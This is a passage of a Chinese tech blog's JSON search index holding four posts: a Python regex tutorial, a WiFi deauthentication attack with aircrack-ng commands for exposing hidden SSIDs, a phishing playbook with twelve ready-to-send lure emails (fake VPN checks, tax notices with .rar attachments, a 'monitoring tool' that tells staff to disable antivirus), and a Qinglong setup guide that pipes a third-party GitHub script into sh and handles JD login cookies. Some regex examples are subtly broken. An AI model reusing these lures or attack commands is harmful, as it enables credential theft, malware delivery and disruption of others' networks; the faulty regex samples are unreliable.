class=\"line\">result2 = re.<span class=\"keyword\">match</span>(<span class=\"string\">&#x27;.+&#x27;</span>, text)   <span class=\"comment\"># 匹配所有字符一次或多次</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>匹配手机号码</p>\n<ul>\n<li>re.match(‘1[3-9][0-9]{9}’, text) <code>第一位固定为1；第二位范围：3-9；第三位范围：0-9，匹配九次</code></li>\n</ul>\n</li>\n<li><p>验证邮箱</p>\n<ul>\n<li>re.match(‘[0-9a-zA-Z]]+@[0-9a-z]+[.]com’, text)</li>\n</ul>\n</li>\n<li><p>验证身份证号</p>\n<ul>\n<li>re.match(‘[0-9]{17}[0-9xX]’, text)  <code>最后一位有可能是大小写的字母x或者数字</code></li>\n</ul>\n</li>\n</ul>\n<hr>\n<h3 id=\"特殊匹配进阶\"><a href=\"#特殊匹配进阶\" class=\"headerlink\" title=\"特殊匹配进阶\"></a>特殊匹配进阶</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">text1 = <span class=\"string\">&#x27;pythonpy&#x27;</span></span><br><span class=\"line\">result1 = re.search(<span class=\"string\">&#x27;py&#x27;</span>, text)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(result1.group())  <span class=\"comment\"># 输出：py</span></span><br><span class=\"line\"><span class=\"comment\"># 全局匹配，只匹配一次</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>^：表示以其后的字符开头，不在中括号内</p>\n</li>\n<li><p>$：表示以其后的字符结尾</p>\n</li>\n<li><p>|：匹配多个表达式或者字符串</p>\n<ul>\n<li>第一种</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">text = <span class=\"string\">&quot;https://www.baidu.com&quot;</span></span><br><span class=\"line\">result = re.search(<span class=\"string\">&#x27;[http|https|ftp|file]+&#x27;</span>, text)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(result.group())  <span class=\"comment\"># 输出：https</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>第二种</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">text = <span class=\"string\">&quot;https://www.baidu.com&quot;</span></span><br><span class=\"line\">result = re.search(<span class=\"string\">&#x27;(http|https|ftp|file)&#x27;</span>, text)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(result.group())  <span class=\"comment\"># 输出：http，因为只要匹配到就算；可以理解成有优先级的概念，所以先匹配到了http</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n<hr>\n<h3 id=\"贪婪模式与非贪婪模式\"><a href=\"#贪婪模式与非贪婪模式\" class=\"headerlink\" title=\"贪婪模式与非贪婪模式\"></a>贪婪模式与非贪婪模式</h3><p><strong>默认：贪婪模式</strong></p>\n<ul>\n<li>贪婪模式：尽可能多的去匹配内容</li>\n<li>非贪婪模式：尽可能少的去匹配内容<code>添加&quot;?&quot;</code></li>\n</ul>\n<hr>\n<h3 id=\"group函数\"><a href=\"#group函数\" class=\"headerlink\" title=\"group函数\"></a>group函数</h3><p><strong>前面的内容都是在做”匹配”，并未执行”提取”</strong></p>\n<p>&#x3D;&#x3D;可以在group(n)中指定序号，表明提取指定的内容（以空格定位：”\\s”）&#x3D;&#x3D;</p>\n<hr>\n<h3 id=\"正则表达式的常用函数\"><a href=\"#正则表达式的常用函数\" class=\"headerlink\" title=\"正则表达式的常用函数\"></a>正则表达式的常用函数</h3><ul>\n<li><p>re.match()：从左往右进行匹配  <code>开头不满足即失败</code></p>\n</li>\n<li><p>re.search()：在整个字符串中查找，返回第一个被找到的字符串  <code>只返回第一个</code></p>\n</li>\n<li><p>re.findall()：在整个字符串中查找所有满足条件的字符串  <code>返回结果为列表，输出不需要group函数，可以直接print</code></p>\n</li>\n<li><p>re.sub()：替换字符串<code>匹配出来的字符串进行替换</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">re.sub(<span class=\"string\">&#x27;\\s(\\w+@[0-9a-z]+\\.com)&#x27;</span>, <span class=\"string\">&#x27;wrong&#x27;</span>, text)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>re.split()：主要用来分隔字符串<code>返回一个列表</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">text = <span class=\"string\">&#x27;I am xxxxx&#x27;</span></span><br><span class=\"line\">re.split(<span class=\"string\">&#x27; &#x27;</span>, text)   <span class=\"comment\"># 匹配字符串以空格分隔</span></span><br><span class=\"line\">re.split(<span class=\"string\">&#x27;[^\\w]&#x27;</span>, text)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>re.compile()：对正则表达式进行编译<code>好处：可以添加注释，防止自己忘了正则的含义</code> <br></p>\n</li>\n</ul>\n<p><img src=\"/../images/image-20230829172013461.png\" alt=\"image-20230829172013461\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">text = <span class=\"string\">r&#x27;&lt;a target=&quot;blank&quot; href= &quot;pos ition_detail.php?id=33824&amp;amp; keywords=python&amp;amp;tid=87&amp;amp; id=2218&quot;&gt;python开发工程师&lt;/a&gt;&#x27;</span></span><br><span class=\"line\">resu1t = re.findall(<span class=\"string\">&#x27;&lt;a.*?href=&quot;(.*?)&quot;.*?&lt;/a&gt;&#x27;</span>, text, re.DOTALL)</span><br><span class=\"line\"><span class=\"comment\"># 前后的&quot;.*?&quot;表示匹配内容，而括号中的表示提取内容</span></span><br></pre></td></tr></table></figure>\n\n","categories":["乱八七糟"],"tags":["正则","内容匹配"]},{"title":"突破关闭SSID广播的WiFi","url":"/2020/12/14/%E7%AA%81%E7%A0%B4%E5%85%B3%E9%97%ADSSID%E5%B9%BF%E6%92%AD%E7%9A%84WiFi/","content":"<h3 id=\"SSID广播的概念\"><a href=\"#SSID广播的概念\" class=\"headerlink\" title=\"SSID广播的概念\"></a>SSID广播的概念</h3><p>​\t\t这里的SSID通常指ESSID(WIFI名字)，用来区分不同的无线网络，是用户给自己的无线网络所取的名字。SSID广 播就是指无线路由器不断的发送自己的SSID，使得周围的无线客户端能够搜索到自己的网络名称,进而可以输入密码后进行连接。</p>\n<p>​\t\t关闭了无线路由器的SSID广播功能之后，正常情况下无线客户端无法直接搜索到无线网络的名称。但是要特别强调，关闭SSID广播功能仅仅是关闭了无线路由器广播信标帧中的SSID部分，并不代表无线路由器的无线信号就不发射和接收了。在客户端手动添加SSID和密码的情况下依然可以正常连接。</p>\n<h3 id=\"DeAuth攻击原理\"><a href=\"#DeAuth攻击原理\" class=\"headerlink\" title=\"DeAuth攻击原理\"></a>DeAuth攻击原理</h3><ol>\n<li><p>发现目标网络：攻击者首先确定目标Wi-Fi网络以及连接到该网络的设备。</p>\n</li>\n<li><p>发送Deauthentication帧：攻击者伪造并发送Deauthentication帧到目标设备。这些帧会模仿合法的Deauthentication帧，使设备认为是无线接入点发出的断开连接信号。</p>\n</li>\n<li><p>断开连接：当目标设备接收到伪造的Deauthentication帧时，它们会解释为断开与Wi-Fi网络的连接的信号，从而使设备失去网络连接。</p>\n</li>\n<li><p>重新连接：在被断开连接后，受影响的设备通常会尝试自动重新连接到网络。然而，如果攻击者持续发送Deauthentication帧，设备可能会在重新连接时遇到困难。</p>\n</li>\n</ol>\n<h3 id=\"DeAuth攻击获取SSID\"><a href=\"#DeAuth攻击获取SSID\" class=\"headerlink\" title=\"DeAuth攻击获取SSID\"></a>DeAuth攻击获取SSID</h3><ol>\n<li><p>激活网卡监听模式：airmon-ng start wlan0 </p>\n</li>\n<li><p>探测无线网络：airodump-ng wlan0mon </p>\n</li>\n<li><p>新建终端窗口进行DeAuth攻击：aireplay-ng -0 5 -a [BSSID] -C [STATION] wlan0mon </p>\n<p>参数解释：-0 采用deauth攻击模式，5为攻击次数，-a 后跟AP的MAC地址，-c 后跟客户端的MAC地址；因为不确定哪个客户端连接该WIFI，即可以多次更换STATION来执行该命令，直到获取SSID</p>\n</li>\n<li><p>获取SSID</p>\n</li>\n</ol>\n<p><strong>kali自带 Aircrack-ng 套件</strong></p>\n<p>下图中红色箭头所指处，表示关闭了SSID广播的，暂时还不知道WiFi名字</p>\n<p><img src=\"/../images/image-20231016012017447.png\" alt=\"image-20231016012017447\"></p>\n","categories":["无线安全"],"tags":["SSID广播","WiFi","DeAuth攻击"]},{"title":"钓鱼思路整理","url":"/2023/05/26/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/","content":"<p><strong>钓鱼思路整理</strong></p>\n<p>一、目标信息收集</p>\n<p>二、目标环境</p>\n<p>三、社交</p>\n<p>四、基础设施</p>\n<p>五、邮件</p>\n<p>六、钓鱼话术模板</p>\n<h3 id=\"一、目标信息收集\"><a href=\"#一、目标信息收集\" class=\"headerlink\" title=\"一、目标信息收集\"></a>一、目标信息收集</h3><ul>\n<li><p>业务范围</p>\n</li>\n<li><ul>\n<li>金融</li>\n<li>医疗</li>\n<li>卫生</li>\n<li>IT</li>\n</ul>\n</li>\n<li><p>组织架构</p>\n</li>\n<li><ul>\n<li>董事会</li>\n<li>高管</li>\n<li>财务</li>\n<li>采购</li>\n<li>运维</li>\n</ul>\n</li>\n<li><p>人员信息</p>\n</li>\n<li><ul>\n<li>针对不同职位采用不同话术</li>\n<li>按照，部门、职务、难易程度分类，分批次投递</li>\n<li>姓名、职位、邮箱、手机</li>\n</ul>\n</li>\n<li><p>目标服务入口</p>\n</li>\n<li><ul>\n<li>VPN、webVPN</li>\n<li>邮服</li>\n<li>SSO认证</li>\n<li>OA认证</li>\n<li>其他内网入口</li>\n<li>帮助文档、使用手册文档信息泄露，收集弱口令</li>\n</ul>\n</li>\n<li><p>站内联系方式</p>\n</li>\n<li><ul>\n<li>新闻投稿、投诉举报、站内信、业务反馈</li>\n</ul>\n</li>\n<li><p>目标新闻</p>\n</li>\n<li><ul>\n<li>了解企业文化、工作动态、便于构造高质量文案，提高效率</li>\n</ul>\n</li>\n<li><p>**库</p>\n</li>\n<li><ul>\n<li>根据收集到的信息进行猎魔查询</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"二、目标环境\"><a href=\"#二、目标环境\" class=\"headerlink\" title=\"二、目标环境\"></a>二、目标环境</h3><ul>\n<li><p>地区用户环境</p>\n</li>\n<li><ul>\n<li>语言、常用邮箱、常用搜索引擎、常用运营商</li>\n</ul>\n</li>\n<li><p>时间、工作时间</p>\n</li>\n<li><ul>\n<li>了解日常工作时间，节假日，尽可能工作日发信</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"三、社交\"><a href=\"#三、社交\" class=\"headerlink\" title=\"三、社交\"></a>三、社交</h3><ul>\n<li>大陆：微信、脉脉、领英、qq、钉钉</li>\n<li>海外：领英、Facebook、Twitter、Line、ins、YouTube、TG</li>\n<li>工作软件进行钓简历</li>\n</ul>\n<h3 id=\"四、基础设施\"><a href=\"#四、基础设施\" class=\"headerlink\" title=\"四、基础设施\"></a>四、基础设施</h3><ul>\n<li>目标地区匿名手机号</li>\n<li>目标地区常用邮箱</li>\n<li>目标近似域名</li>\n</ul>\n<h3 id=\"五、邮件\"><a href=\"#五、邮件\" class=\"headerlink\" title=\"五、邮件\"></a>五、邮件</h3><ul>\n<li><p>话术</p>\n</li>\n<li><ul>\n<li>落款信息、开头语、结束语、标题、发信人名称&#x2F;部门名称</li>\n</ul>\n</li>\n<li><p>邮件格式</p>\n</li>\n<li><ul>\n<li>仿正规邮件，无明显钓鱼邮件格式，邮件添加logo增加可信度</li>\n</ul>\n</li>\n<li><p>发信IP或服务</p>\n</li>\n<li><ul>\n<li>优先选择第三方邮件服务，正规无拉黑</li>\n</ul>\n</li>\n<li><p>发信频率</p>\n</li>\n<li><ul>\n<li>多批次，少投递，高精准</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"六、钓鱼话术模板\"><a href=\"#六、钓鱼话术模板\" class=\"headerlink\" title=\"六、钓鱼话术模板\"></a>六、钓鱼话术模板</h3><h5 id=\"案例一：亲爱的同事们\"><a href=\"#案例一：亲爱的同事们\" class=\"headerlink\" title=\"案例一：亲爱的同事们\"></a>案例一：亲爱的同事们</h5><p>近期，公司监控系统捕捉到某些VPN账号存在数次异常操作行为，根据我司(集团)网络安全规定，为确保账号安全，现需要所有具有VPN登录权限的同事配合(无VPN登录权限的同事可直接忽略此邮件)，尽快重新登录VPN系统以完成VPN账号安全检查，登录VPN系统自动检查账号安全性，检查过程将全程自动进行，无需人工干预，具体操作如下图所示，注:逾期未进行安全自检的VPN账号将全部被收回或锁定，系统邮件，请勿回复</p>\n<h5 id=\"案例二：关于2021年度绩效结算个人所得税税收优化的情况通报\"><a href=\"#案例二：关于2021年度绩效结算个人所得税税收优化的情况通报\" class=\"headerlink\" title=\"案例二：关于2021年度绩效结算个人所得税税收优化的情况通报\"></a>案例二：关于2021年度绩效结算个人所得税税收优化的情况通报</h5><p>关于2021年度绩效结算个人所得税税收优化的情况通报各单位：</p>\n<p>根据《关于延续实施全年一次性奖金等个人所得税优惠政策的公告》（财政部税务总局2021年第42号公告），全年一次性奖金单独计税优惠政策，执行期限延长至2023年12月31日。</p>\n<p>为确保广大职工充分享受该项税收优惠政策，2021年底计财处对每一名职工的全年工薪收入和各类扣除情况进行了分析测算，按政策将大部分职工年底发放的部分绩效结算金额按全年一次性奖金优化计税。优化后，有78.2%的职工可节约税金。在2022年2月底申报期完成全年一次性奖金纳税申报后，计财处会按程序将节约的税金发至职工银行卡上。</p>\n<p>需要说明：经过对职工全年应缴税额和已扣税额对比，有部分职工需要补税（名单见附件），补税的金额将在后续发放的绩效中扣除。产生补税的原因主要是部分职工在2021年12月通过个人所得税APP修改了专项附加扣除，由于操作不当，导致全年专项附加扣除额度减少，从而应缴税额增加。建议这部分职工在使用个人所得税年度APP进行汇算清缴时，将专项附加扣除修改正确，可申请退回这部分税金。</p>\n<p><strong>附件名称：2021年度本单位职工个税补缴名单.rar</strong></p>\n<h5 id=\"案例三：钓鱼案例：Chrome漏洞一键修复\"><a href=\"#案例三：钓鱼案例：Chrome漏洞一键修复\" class=\"headerlink\" title=\"案例三：钓鱼案例：Chrome漏洞一键修复\"></a>案例三：钓鱼案例：Chrome漏洞一键修复</h5><p>补丁欺骗、利用Tools欺骗、通知欺骗。等思路结合，自行脑补</p>\n<p>  <img src=\"/../images/image-20231017021052317.png\" alt=\"image-20231017021052317\"></p>\n<h5 id=\"案例四：以假乱真\"><a href=\"#案例四：以假乱真\" class=\"headerlink\" title=\"案例四：以假乱真\"></a>案例四：以假乱真</h5><p><img src=\"/../images/image-20231017021109216.png\" alt=\"image-20231017021109216\"></p>\n<ul>\n<li>邮箱账户备案登记</li>\n</ul>\n<p><img src=\"/../images/image-20231017021122995.png\" alt=\"image-20231017021122995\"></p>\n<h5 id=\"案例五：食堂满意度调查\"><a href=\"#案例五：食堂满意度调查\" class=\"headerlink\" title=\"案例五：食堂满意度调查\"></a>案例五：食堂满意度调查</h5><p>各位员⼯: 为了完善公司⻝堂管理，持续提⾼服务质量，让员⼯更加精神饱满的⼯作，希望⼤家从公司及⾃身实际 出发，积极配合、认真、详实的填写⻝堂满意度调查。谢谢配合！链接如下</p>\n<h5 id=\"案例六：绩效自评\"><a href=\"#案例六：绩效自评\" class=\"headerlink\" title=\"案例六：绩效自评\"></a>案例六：绩效自评</h5><p>各位同事好： 近期经过管理层商议决定，我们公司将于x⽉x⽇实施2021新⼀轮薪资架构，为了更好的保障员⼯的权利，需要您配合填写员⼯绩效⾃我考核，并于x⽉x⽇内填写回复完成，员⼯个⼈⼯作绩效评价表格将作为晋升、加薪等调整的依据之⼀。请对您在2021财年所承担的⼯作任务及个⼈⼯作成果进⾏客观、具体、如实地评价。 并在2021年x⽉x⽇23点前，以邮件形式回复 附件： 绩效⾃评.zip</p>\n<h5 id=\"案例七：工装尺寸手机\"><a href=\"#案例七：工装尺寸手机\" class=\"headerlink\" title=\"案例七：工装尺寸手机\"></a>案例七：工装尺寸手机</h5><p>各位同事： 为了塑造公司员⼯良好形象，体现员⼯饱满的精神⾯貌，现就公司着装做出要求，要求上下班必须着⼯装。 公司正在为各部⻔员⼯配置⼯装，现需收集您⾐服尺⼨⼤⼩，链接如下： <a href=\"http://xxxx.xxx,要求必须5月xx日前填写,过期不候.谢谢配合!/\">http://xxxx.xxx，要求必须5⽉xx⽇前填写，过期不候。谢谢配合！</a></p>\n<h5 id=\"案例八：网络安全风险提示和办公电脑加固手册\"><a href=\"#案例八：网络安全风险提示和办公电脑加固手册\" class=\"headerlink\" title=\"案例八：网络安全风险提示和办公电脑加固手册\"></a>案例八：网络安全风险提示和办公电脑加固手册</h5><p>各位领导、同事： ⼤家好！据⽹络安全监测⼩组提示，近期检测到多名员⼯协同办公系统发⽣异地异常登录情况，分 析原因可能为协同办公系统账号采⽤了简单密码。为杜绝此类事件的再次发⽣，请各部⻔组织员⼯ 修改使⽤复杂密码，并学习《办公环境信息安全加固⼿册》。 密码修改策略要求： （1）密码的⻓度⾄少为12个字符，需采⽤⼤⼩写、特殊字符、数字的组合⽅式。 （2）密码不得使⽤⽣⽇、姓名拼⾳等个⼈信息。 有问题及时沟通，谢谢。 附件《办公环境信息安全加固⼿册》，解 压：XXXX xxx 2021年11⽉X⽇</p>\n<h5 id=\"案例九：社保缴纳异常通知书\"><a href=\"#案例九：社保缴纳异常通知书\" class=\"headerlink\" title=\"案例九：社保缴纳异常通知书\"></a>案例九：社保缴纳异常通知书</h5><p>公司在为您购买社保时因您个⼈原因社保在册导致公司⽆法为您缴纳社会保险（即养⽼、医疗、失业、 ⼯伤、⽣育、⼤病保险）。请本⽉14号之前办理社保相关⼿续以保证公司能正常为您缴纳社保。 2 若因个⼈未到社保局机构办理相关社保⼿续（减少、转移等）⽽导致公司⽆法为您购买社保，公司将不 予补缴。在此期间造成的损失由本⼈⾃⾏承担。 本通知书⼀式两份，公司和员⼯各执⼀份。本通知书⾃签字之⽇起⽣效，涂改⽆效。 本⼈已收到《社保缴纳异常通知书》，知晓并接受通知书上所述内容。 员⼯签名： 时间：年⽉⽇ 2021年11⽉1⽇</p>\n<h5 id=\"案例十：关于护网行动2022安全补丁更新通知\"><a href=\"#案例十：关于护网行动2022安全补丁更新通知\" class=\"headerlink\" title=\"案例十：关于护网行动2022安全补丁更新通知\"></a>案例十：关于护网行动2022安全补丁更新通知</h5><p>为全⼒做好党⼆⼗⼤⽹络安全保障⼯作，公安部拟于7⽉26号启动“护⽹2022”⽹络安全攻防实战演 习，持续到8⽉初。我们公司也作为防守单位参与其中。 为了保障公司电脑终端安全，公司联系安全⼚商紧急制作出了针对护⽹⾏动的安全补丁，请全员对电 脑终端进⾏安装安全补丁，做好终端防护，防⽌个⼈pc终端遭受病毒攻击。 请各位务必安装补丁，本次演习级别⾼，责任重⼤ 依据公司部署，本次演习需要全员重视，将严格按照谁主管谁负责，谁运营谁负责来执⾏</p>\n<h5 id=\"案例十一：VPN证书过期重装\"><a href=\"#案例十一：VPN证书过期重装\" class=\"headerlink\" title=\"案例十一：VPN证书过期重装\"></a>案例十一：VPN证书过期重装</h5><p>尊敬的xxx： 您的vpn证书：f416cd055a647ff98fd439e726d431f，将于2021-05-xx 00:00:00正式到期,截⾄⽬前仅 剩x天。为了不影响您的正常使⽤，请您及时下载安装新的证书，证书⻅附件：</p>\n<h5 id=\"案例十二：安装监控软件\"><a href=\"#案例十二：安装监控软件\" class=\"headerlink\" title=\"案例十二：安装监控软件\"></a>案例十二：安装监控软件</h5><p>为了完善公司内部办公环境，提高公司内部办公效率和监控，请各位同事务必安装和升级XXX自查工具，如遇杀毒软件拦截，请关闭杀毒软件再次安装。日后会有上级检查小组进行检查，存在问题终端人员会纳入年底考核。</p>\n","categories":["钓鱼"],"tags":["社会工程学","钓鱼邮件"]},{"title":"青龙面板搭建与使用","url":"/2023/09/28/%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E6%90%AD%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/","content":"<h3 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h3><ul>\n<li>CentOS</li>\n<li>docker</li>\n</ul>\n<p>项目地址：<a href=\"https://github.com/whyour/qinglong\">https://github.com/whyour/qinglong</a></p>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -dit \\</span><br><span class=\"line\">  -p 5700:5700 \\</span><br><span class=\"line\">  --name qinglong \\</span><br><span class=\"line\">  --hostname qinglong \\</span><br><span class=\"line\">  --restart always \\</span><br><span class=\"line\">  -v /root/ql/data:/ql/data \\</span><br><span class=\"line\">  -v /root/ql/config:/ql/config \\</span><br><span class=\"line\">  -v /root/ql/log:/ql/log \\</span><br><span class=\"line\">  -v /root/ql/db:/ql/db \\</span><br><span class=\"line\">  -v /root/ql/scripts:/ql/scripts \\</span><br><span class=\"line\">  -v /root/ql/jbot:/ql/jbot \\</span><br><span class=\"line\">  -v /root/ql/repo:/ql/repo \\</span><br><span class=\"line\">  -v /root/ql/deps:/ql/deps \\</span><br><span class=\"line\">  whyour/qinglong:latest</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/image-20231001003233854.png\" alt=\"image-20231001003233854\"></p>\n<p>查看容器</p>\n<p><img src=\"/../images/image-20231001003255957.png\" alt=\"image-20231001003255957\"></p>\n<p>访问：IP:5700</p>\n<p><img src=\"/../images/image-20231016002245383.png\" alt=\"image-20231016002245383\"></p>\n<p>安装依赖</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 进入青龙的交互式shell</span><br><span class=\"line\">docker exec -it qinglong bash</span><br><span class=\"line\"># 添加依赖（较慢）</span><br><span class=\"line\">curl -fsSL https://ghproxy.com/https://raw.githubusercontent.com/bean661/utils/main/QLOneKeyDependency.sh | sh</span><br><span class=\"line\"></span><br><span class=\"line\"># 如果依赖安装报错，终止命令，重新安装依赖即可</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/image-20231001003351970.png\" alt=\"image-20231001003351970\"></p>\n<p>重启容器</p>\n<p><img src=\"/../images/image-20231001003418277.png\" alt=\"image-20231001003418277\"></p>\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><p>登录青龙面板</p>\n<p><img src=\"/../images/image-20231001004015992.png\" alt=\"image-20231001004015992\"></p>\n<p>配置拉库</p>\n<p><img src=\"/../images/image-20231001004031233.png\" alt=\"image-20231001004031233\"></p>\n<p>运行，下载脚本文件</p>\n<p><img src=\"/../images/image-20231001004053425.png\" alt=\"image-20231001004053425\"></p>\n<p>等待一段时间，下载成功</p>\n<p><img src=\"/../images/image-20231001004111259.png\" alt=\"image-20231001004111259\"></p>\n<p>在环境变量选项，添加京东的cookie</p>\n<p><img src=\"/../images/image-20231001004129272.png\" alt=\"image-20231001004129272\"></p>\n<p>登录京东手机网页版：<a href=\"https://m.jd.com/\">https://m.jd.com</a>，找到cookie</p>\n<p><img src=\"/../images/image-20231001003807402.png\" alt=\"image-20231001003807402\"></p>\n<p>添加Cookie到环境变量</p>\n<p><img src=\"/../images/image-20231001003938215.png\" alt=\"image-20231001003938215\"></p>\n<p>定时任务处，随便找一个任务，运行并查看日志，出现如下结果，证明配置正确</p>\n<p><img src=\"/../images/image-20231001004357052.png\" alt=\"image-20231001004357052\"></p>\n<h3 id=\"问题集锦\"><a href=\"#问题集锦\" class=\"headerlink\" title=\"问题集锦\"></a>问题集锦</h3><ol>\n<li>如果某些任务有特殊的模块需要安装，在日志中复制模块的名称，然后在依赖管理中添加即可</li>\n</ol>\n<p><img src=\"/../images/image-20231001004229682.png\" alt=\"image-20231001004229682\"></p>\n<p>安装依赖</p>\n<p><img src=\"/../images/image-20231001004244541.png\" alt=\"image-20231001004244541\"></p>\n<ol start=\"2\">\n<li>配置代理、支持拉取的脚本扩展</li>\n</ol>\n<p><img src=\"/../images/image-20231001004322243.png\" alt=\"image-20231001004322243\"></p>\n","categories":["乱八七糟"],"tags":["薅羊毛","定时任务","docker","自动化"]}]